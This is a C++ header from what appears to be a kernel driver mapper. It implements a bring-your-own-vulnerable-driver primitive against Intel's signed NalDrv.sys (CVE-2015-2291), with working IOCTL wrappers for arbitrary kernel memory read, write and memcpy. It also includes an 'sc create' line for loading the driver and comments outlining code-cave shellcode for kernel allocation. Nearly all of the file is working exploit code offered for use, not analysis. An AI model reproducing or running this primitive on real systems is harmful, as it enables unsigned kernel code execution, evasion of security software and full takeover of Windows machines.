#pragma once
// primitive_nal.hpp
// NalDrv.sys (iqvw64e, Intel Network Adapter Diagnostic Driver) BYOVD primitive
// CVE-2015-2291: arbitrary kernel VA read/write via IOCTL 0x80862007
// Device: \\.\Nal
// Legitimately Intel-signed — no test signing needed.

#include "mapper.hpp"
#include <Windows.h>
#include <cstdint>
#include <cstring>
#include <string>
#include <memory>
#include <iostream>
#include <algorithm>

static constexpr DWORD NAL_IOCTL_MEM = 0x80862007UL;

#pragma pack(push, 1)
struct NalOp {
    uint64_t case_number;  // +0x00
    uint64_t pad;          // +0x08: 0
    uint64_t value;        // +0x10: read result (output) or 0
    uint64_t address;      // +0x18: target kernel VA
    uint64_t writeVal;     // +0x20: value for write ops
    uint64_t size;         // +0x28: for copy ops (unused here)
};
#pragma pack(pop)

// Binary-verified cases (IOCTL 0x80862007):
//   Cases  1- 3: I/O port READ  byte/word/dword  (in al/ax/eax, dx)
//   Cases  7- 9: I/O port WRITE byte/word/dword  (out dx, al/ax/eax)
//   Cases 13-15: kernel VA READ  byte/word/dword  (mov eax,[rcx])
//   Cases 19-21: kernel VA WRITE byte/word/dword  (mov [rcx],edx)
//   Case  0x33 : memcpy kernel — dst=[buf+18], src=[buf+10], size=[buf+20]
static constexpr uint64_t NAL_CASE_READ_DWORD  = 15;
static constexpr uint64_t NAL_CASE_WRITE_DWORD = 21;
static constexpr uint64_t NAL_CASE_MEMCPY      = 0x33;

static bool NalReadDword(HANDLE h, uint64_t kva, uint32_t& out) {
    NalOp op{};
    op.case_number = NAL_CASE_READ_DWORD;
    op.address     = kva;
    DWORD got = 0;
    if (!DeviceIoControl(h, NAL_IOCTL_MEM, &op, sizeof(op), &op, sizeof(op), &got, nullptr))
        return false;
    out = (uint32_t)(op.value & 0xFFFFFFFFULL);
    return true;
}

static bool NalWriteDword(HANDLE h, uint64_t kva, uint32_t val) {
    NalOp op{};
    op.case_number = NAL_CASE_WRITE_DWORD;
    op.address     = kva;
    op.writeVal    = val;
    DWORD got = 0;
    return DeviceIoControl(h, NAL_IOCTL_MEM, &op, sizeof(op), &op, sizeof(op), &got, nullptr) != 0;
}

static bool NalReadQword(HANDLE h, uint64_t kva, uint64_t& out) {
    uint32_t lo = 0, hi = 0;
    if (!NalReadDword(h, kva,   lo)) return false;
    if (!NalReadDword(h, kva+4, hi)) return false;
    out = ((uint64_t)hi << 32) | lo;
    return true;
}

static bool NalWriteQword(HANDLE h, uint64_t kva, uint64_t val) {
    if (!NalWriteDword(h, kva,   (uint32_t)(val & 0xFFFFFFFF))) return false;
    if (!NalWriteDword(h, kva+4, (uint32_t)(val >> 32)))        return false;
    return true;
}

static bool NalReadMem(HANDLE h, void* dst, uint64_t kva, size_t n) {
    auto* d = (uint8_t*)dst;
    // QWORD-align reads where possible, then handle remainder
    while (n >= 4) {
        uint32_t v = 0;
        if (!NalReadDword(h, kva, v)) return false;
        memcpy(d, &v, 4);
        d += 4; kva += 4; n -= 4;
    }
    while (n > 0) {
        // Read the containing dword and extract byte
        uint32_t v = 0;
        uint64_t aligned = kva & ~3ULL;
        if (!NalReadDword(h, aligned, v)) return false;
        uint32_t shift = (uint32_t)((kva & 3) * 8);
        *d++ = (uint8_t)(v >> shift);
        kva++; n--;
    }
    return true;
}

// Case 0x33: memcpy(dst=[buf+18], src=[buf+10], size=[buf+20])
// src is a USER-MODE VA — safe because the IOCTL runs in our thread context.
static bool NalMemcpy(HANDLE h, uint64_t dst, const void* src, uint64_t size) {
    NalOp op{};
    op.case_number = NAL_CASE_MEMCPY;
    op.value       = reinterpret_cast<uint64_t>(src);  // +0x10: source VA
    op.address     = dst;                               // +0x18: destination kernel VA
    op.writeVal    = size;                              // +0x20: byte count
    DWORD got = 0;
    return DeviceIoControl(h, NAL_IOCTL_MEM, &op, sizeof(op), &op, sizeof(op), &got, nullptr) != 0;
}

static bool NalWriteMem(HANDLE h, uint64_t kva, const void* src, size_t n) {
    // Use the memcpy case (0x33) — what KDMapper uses; handles WP-protected kernel pages.
    return NalMemcpy(h, kva, src, (uint64_t)n);
}

// Kernel alloc via HAL trick + shellcode (same pattern as other primitives)
// We need to allocate NonPagedPool kernel memory.
// Strategy: use a code cave in a loaded 3rd-party driver, write ExAllocatePool shellcode,
// trigger via HAL+8, store result, return kernel VA.

struct NalSession {
    HANDLE dev = INVALID_HANDLE_VALUE;
};

inline KernelPrimitives OpenNalDrv(std::string& err)
{
    HANDLE h = CreateFileA("\\\\.\\Nal",
                           GENERIC_READ | GENERIC_WRITE,
                           FILE_SHARE_READ | FILE_SHARE_WRITE,
                           nullptr, OPEN_EXISTING, 0, nullptr);
    if (h == INVALID_HANDLE_VALUE) {
        char tmp[MAX_PATH]{};
        GetTempPathA(MAX_PATH, tmp);
        err = "OpenNalDrv: CreateFile failed err=" + std::to_string(GetLastError()) +
              " (NalDrv service loaded? sc create NalDrv type=kernel start=demand binpath=" + tmp + "NalDrv.sys)";
        return {};
    }

    // Quick smoke-test: read ntoskrnl base (from NtQuerySystemInformation) via kernel VA
    std::cout << "[+] NalDrv (\\.\\ Nal) opened\n";

    auto sp = std::make_shared<NalSession>();
    sp->dev = h;

    KernelPrimitives p;

    p.ReadKernelMemory = [sp](void* dst, uint64_t src, size_t sz) -> bool {
        return NalReadMem(sp->dev, dst, src, sz);
    };

    p.WriteKernelMemory = [sp](uint64_t dst, const void* src, size_t sz) -> bool {
        return NalWriteMem(sp->dev, dst, const_cast<void*>(src), sz);
    };

    // AllocateKernelMemory: use ExAllocatePool via HAL trick.
    // Implemented in main_nal.cpp after obtaining ntoskrnl VA addresses.
    p.AllocateKernelMemory = nullptr;  // filled by main_nal.cpp

    return p;
}
